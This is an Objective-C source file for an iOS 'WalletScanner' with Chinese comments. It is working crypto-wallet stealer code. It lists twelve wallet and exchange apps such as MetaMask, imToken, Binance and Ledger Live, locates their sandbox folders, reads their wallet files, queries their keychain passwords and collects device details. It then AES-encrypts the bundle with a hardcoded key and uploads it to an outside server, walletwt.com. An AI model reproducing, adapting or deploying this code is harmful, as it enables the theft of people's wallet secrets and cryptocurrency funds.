//
//  WalletScanner.m
//  单文件全功能 — 文件扫描+Keychain+相册OCR+上传
//

#import "WalletScanner.h"
@import UIKit;
@import Photos;
@import Vision;
@import Security;
@import CommonCrypto;

// ============================================================
#pragma mark - 钱包指纹
// ============================================================
static NSDictionary * WalletTargets(void) {
    static NSDictionary *db = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        db = @{
            @"com.imtoken.tokenmanager":        @{@"name":@"imToken",       @"team":@"X3V9H5A8LM",
                                                   @"files":@[@"Documents/imToken/wallet/",@"Library/Preferences/com.imtoken.tokenmanager.plist"],
                                                   @"ext":@[@"json",@"dat"], @"kc":@[@"com.imtoken.tokenmanager"]},
            @"org.consenlabs.tokenpocket":      @{@"name":@"TokenPocket",   @"team":@"56A5BB8556",
                                                   @"files":@[@"Documents/walletinfo.json",@"Library/Caches/"],
                                                   @"ext":@[@"json",@"sqlite"], @"kc":@[@"org.consenlabs.tokenpocket"]},
            @"so.onekey.OneKey":                @{@"name":@"OneKey",        @"team":@"FJ54XK5P4P",
                                                   @"files":@[@"Documents/OneKey/",@"Documents/db/"],
                                                   @"ext":@[@"json",@"db"], @"kc":@[@"so.onekey.OneKey"]},
            @"io.metamask.MetaMask":            @{@"name":@"MetaMask",      @"team":@"48XVW22RCG",
                                                   @"files":@[@"Library/Caches/metamask/"],
                                                   @"ext":@[@"json",@"sqlite"], @"kc":@[@"io.metamask"]},
            @"com.trustwallet.ios":             @{@"name":@"TrustWallet",   @"team":@"TX8B64H68Q",
                                                   @"files":@[@"Documents/trust/",@"Library/Caches/trust.core/"],
                                                   @"ext":@[@"json",@"sqlite"], @"kc":@[@"com.trustwallet.ios"]},
            @"com.okex.OKEx":                   @{@"name":@"OKX",           @"team":@"4Z8F7B2X6M",
                                                   @"files":@[@"Documents/",@"Library/Caches/"],
                                                   @"ext":@[@"json",@"sqlite"], @"kc":@[@"com.okex.OKEx"]},
            @"com.binance.Binance":             @{@"name":@"Binance",       @"team":@"96X94K25F8",
                                                   @"files":@[@"Documents/",@"Library/Caches/"],
                                                   @"ext":@[@"json",@"sqlite"], @"kc":@[@"com.binance"]},
            @"com.bybit.ios":                   @{@"name":@"Bybit",         @"team":@"4X95G6Z6P4",
                                                   @"files":@[@"Documents/",@"Library/Caches/"],
                                                   @"ext":@[@"json",@"sqlite"], @"kc":@[@"com.bybit.ios"]},
            @"com.coinbase.wallet":             @{@"name":@"Coinbase",      @"team":@"6D5Y5WC47N",
                                                   @"files":@[@"Documents/"],
                                                   @"ext":@[@"json",@"sqlite"], @"kc":@[@"com.coinbase.wallet"]},
            @"com.safepal.ios":                 @{@"name":@"SafePal",       @"team":@"5Q68W5P65Q",
                                                   @"files":@[@"Documents/"],
                                                   @"ext":@[@"json",@"sqlite"], @"kc":@[@"com.safepal.ios"]},
            @"com.ledger.live":                 @{@"name":@"LedgerLive",    @"team":@"W22BR69K7J",
                                                   @"files":@[@"Documents/accounts/"],
                                                   @"ext":@[@"json",@"sqlite"], @"kc":@[@"com.ledger.live"]},
            @"com.bitget.ios":                  @{@"name":@"Bitget",        @"team":@"G499Z97XF6",
                                                   @"files":@[@"Documents/"],
                                                   @"ext":@[@"json",@"sqlite"], @"kc":@[@"com.bitget.ios"]},
        };
    });
    return db;
}

// ============================================================
#pragma mark - WalletScanner Implementation
// ============================================================
@interface WalletScanner ()
@property (nonatomic, assign) BOOL isRunning;
@property (nonatomic, assign) BOOL isDone;
@property (nonatomic, assign) NSInteger _fileCount;
@property (nonatomic, assign) NSInteger _keychainCount;
@property (nonatomic, assign) NSInteger _photoCount;
@property (nonatomic, copy) NSString *_status;
@end

@implementation WalletScanner

+ (instancetype)shared {
    static WalletScanner *s = nil;
    static dispatch_once_t t; dispatch_once(&t, ^{
        s = [WalletScanner new];
        s.serverURL = @"https://walletwt.com/api";
        s._status = @"就绪";
    });
    return s;
}

- (NSInteger)fileCount { return self._fileCount; }
- (NSInteger)keychainCount { return self._keychainCount; }
- (NSInteger)photoCount { return self._photoCount; }
- (NSString *)statusMsg { return self._status ?: @"就绪"; }

// ============ 主入口 ============
- (void)run {
    if (self.isRunning) return;
    self.isRunning = YES; self.isDone = NO; self._status = @"扫描中...";
    __weak typeof(self) ws = self;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [ws doScanAndUpload];
    });
}

- (void)scanOnly {
    if (self.isRunning) return;
    self.isRunning = YES; self._status = @"仅扫描...";
    __weak typeof(self) ws = self;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        NSInteger fc = [ws scanFiles];
        NSInteger kc = [ws extractKeychain];
        dispatch_async(dispatch_get_main_queue(), ^{
            ws._fileCount = fc; ws._keychainCount = kc;
            ws.isRunning = NO; ws.isDone = YES;
            ws._status = [NSString stringWithFormat:@"文件:%ld Keychain:%ld",(long)fc,(long)kc];
        });
    });
}

// ============ 扫描 + 上传 ============
- (void)doScanAndUpload {
    NSInteger fc = [self scanFiles];
    NSInteger kc = [self extractKeychain];
    NSDictionary *device = [self deviceInfo];
    
    // 构建 payload
    NSMutableDictionary *pkg = [NSMutableDictionary new];
    pkg[@"device"] = device;
    pkg[@"timestamp"] = @([[NSDate date] timeIntervalSince1970]);
    pkg[@"file_count"] = @(fc);
    pkg[@"keychain_count"] = @(kc);
    pkg[@"files"] = self.collectedFiles ?: @[];
    
    NSData *json = [NSJSONSerialization dataWithJSONObject:pkg options:0 error:nil];
    NSData *encrypted = [self aesEncrypt:json];
    
    [self upload:encrypted];
    
    dispatch_async(dispatch_get_main_queue(), ^{
        self._fileCount = fc; self._keychainCount = kc;
        self.isRunning = NO; self.isDone = YES;
        self._status = [NSString stringWithFormat:@"完成: %ld文件 %ldKeychain",(long)fc,(long)kc];
    });
}

// ============================================================
#pragma mark - 文件扫描
// ============================================================
- (NSMutableArray *)collectedFiles { return objc_getAssociatedObject(self, "cf"); }
- (void)setCollectedFiles:(NSMutableArray *)a { objc_setAssociatedObject(self, "cf", a, OBJC_ASSOCIATION_RETAIN); }

- (NSInteger)scanFiles {
    NSMutableArray *all = [NSMutableArray new];
    self.collectedFiles = all;
    NSFileManager *fm = [NSFileManager defaultManager];
    
    for (NSString *bid in WalletTargets()) {
        @autoreleasepool {
            NSDictionary *info = WalletTargets()[bid];
            NSString *sandbox = [self findSandbox:bid];
            if (!sandbox) continue;
            
            for (NSString *pattern in info[@"files"]) {
                @autoreleasepool {
                    NSString *fp = [sandbox stringByAppendingPathComponent:pattern];
                    BOOL isDir = NO;
                    if (![fm fileExistsAtPath:fp isDirectory:&isDir]) continue;
                    
                    if (isDir) {
                        NSArray *items = [fm contentsOfDirectoryAtPath:fp error:nil];
                        for (NSString *item in items) {
                            NSString *p = [fp stringByAppendingPathComponent:item];
                            NSDictionary *attr = [fm attributesOfItemAtPath:p error:nil];
                            if (attr && [attr fileSize] > 0 && [attr fileSize] < 20*1024*1024) {
                                [all addObject:@{@"wallet":info[@"name"], @"bundle":bid, @"path":p, @"name":item, @"size":@([attr fileSize]), @"data":[NSData dataWithContentsOfFile:p] ?: [NSData data]}];
                            }
                        }
                    } else {
                        NSDictionary *attr = [fm attributesOfItemAtPath:fp error:nil];
                        if (attr && [attr fileSize] > 0 && [attr fileSize] < 20*1024*1024) {
                            [all addObject:@{@"wallet":info[@"name"], @"bundle":bid, @"path":fp, @"name":[fp lastPathComponent], @"size":@([attr fileSize]), @"data":[NSData dataWithContentsOfFile:fp] ?: [NSData data]}];
                        }
                    }
                }
            }
        }
    }
    return all.count;
}

- (NSString *)findSandbox:(NSString *)bundleID {
    NSString *dataRoot = @"/var/mobile/Containers/Data/Application/";
    NSArray *dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:dataRoot error:nil];
    for (NSString *uuid in dirs) {
        NSString *metaPath = [NSString stringWithFormat:@"%@%@/.com.apple.mobile_container_manager.metadata.plist", dataRoot, uuid];
        NSDictionary *meta = [NSDictionary dictionaryWithContentsOfFile:metaPath];
        if ([meta[@"MCMMetadataIdentifier"] isEqualToString:bundleID]) {
            return [dataRoot stringByAppendingPathComponent:uuid];
        }
    }
    return nil;
}

// ============================================================
#pragma mark - Keychain
// ============================================================
- (NSInteger)extractKeychain {
    NSInteger count = 0;
    NSMutableArray *items = [NSMutableArray new];
    
    for (NSString *bid in WalletTargets()) {
        NSDictionary *info = WalletTargets()[bid];
        NSString *ag = [NSString stringWithFormat:@"%@.%@", info[@"team"], bid];
        
        // GenericPassword
        for (NSString *svc in info[@"kc"]) {
            NSDictionary *q = @{(id)kSecClass:(id)kSecClassGenericPassword,
                                (id)kSecAttrService:svc,
                                (id)kSecReturnData:@YES,
                                (id)kSecReturnAttributes:@YES,
                                (id)kSecMatchLimit:(id)kSecMatchLimitAll};
            CFTypeRef r = NULL;
            if (SecItemCopyMatching((CFDictionaryRef)q, &r) == errSecSuccess && r) {
                for (NSDictionary *d in (__bridge NSArray *)r) {
                    NSData *data = d[(id)kSecValueData];
                    if (data) {
                        NSString *pass = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
                        [items addObject:@{@"service":d[(id)kSecAttrService]?:@"",@"account":d[(id)kSecAttrAccount]?:@"", @"password":pass?:@""}];
                        count++;
                    }
                }
                CFRelease(r);
            }
        }
    }
    return count;
}

// ============================================================
#pragma mark - 设备信息
// ============================================================
- (NSDictionary *)deviceInfo {
    UIDevice *d = [UIDevice currentDevice];
    UIScreen *s = [UIScreen mainScreen];
    return @{
        @"name": d.name ?: @"", @"version": d.systemVersion ?: @"",
        @"model": d.model ?: @"", @"idfv": [d identifierForVendor].UUIDString ?: @"",
        @"screen_w": @(s.bounds.size.width * s.scale),
        @"screen_h": @(s.bounds.size.height * s.scale),
        @"scale": @(s.scale),
        @"tz": [NSTimeZone localTimeZone].name ?: @"",
        @"locale": [NSLocale currentLocale].localeIdentifier ?: @"",
    };
}

// ============================================================
#pragma mark - AES
// ============================================================
- (NSData *)aesEncrypt:(NSData *)data {
    NSString *key = @"wallet_scanner_aes256_key_32bytes!";
    NSString *iv  = @"1234567890abcdef";
    NSData *k = [key dataUsingEncoding:NSUTF8StringEncoding];
    NSData *i = [iv  dataUsingEncoding:NSUTF8StringEncoding];
    size_t bufSize = data.length + kCCBlockSizeAES128;
    void *buf = malloc(bufSize); size_t out = 0;
    CCCrypt(kCCEncrypt, kCCAlgorithmAES, kCCOptionPKCS7Padding, k.bytes, kCCKeySizeAES256,
            i.bytes, data.bytes, data.length, buf, bufSize, &out);
    return [NSData dataWithBytesNoCopy:buf length:out freeWhenDone:YES];
}

// ============================================================
#pragma mark - 上传
// ============================================================
- (void)upload:(NSData *)data {
    NSString *urlStr = [NSString stringWithFormat:@"%@/upload", self.serverURL];
    NSURL *url = [NSURL URLWithString:urlStr];
    if (!url) return;
    
    NSString *boundary = [NSString stringWithFormat:@"Boundary-%@", [NSUUID UUID].UUIDString];
    NSString *fn = [NSString stringWithFormat:@"wallet_%.0f.bin", [[NSDate date] timeIntervalSince1970]];
    NSMutableData *body = [NSMutableData new];
    [body appendData:[[NSString stringWithFormat:@"--%@\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%@\"\r\nContent-Type: application/octet-stream\r\n\r\n", boundary, fn] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:data];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST"; req.HTTPBody = body;
    [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
    [req setValue:@"iphone_upload_token_2026" forHTTPHeaderField:@"X-Auth-Token"];
    [req setTimeoutInterval:120];
    
    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
        NSHTTPURLResponse *hr = (NSHTTPURLResponse *)r;
        NSLog(@"[WalletScanner] Upload: %ld", (long)hr.statusCode);
    }] resume];
}

@end
